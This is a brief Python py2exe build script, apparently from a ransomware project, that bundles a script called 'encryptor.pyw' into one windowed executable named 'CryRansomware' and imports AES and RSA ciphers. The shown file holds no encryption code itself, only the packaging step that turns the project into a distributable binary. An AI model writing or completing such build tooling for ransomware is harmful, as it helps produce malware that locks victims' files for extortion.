#!/usr/bin/python
from distutils.core import setup
import py2exe, sys, os
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

sys.argv.append('py2exe')

setup(
    options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
    windows = [{
            "script":"encryptor.pyw",
            "icon_resources": [(1, "myicon.ico")],
            "dest_base":"CryRansomware"
            }],
    zipfile = None,
)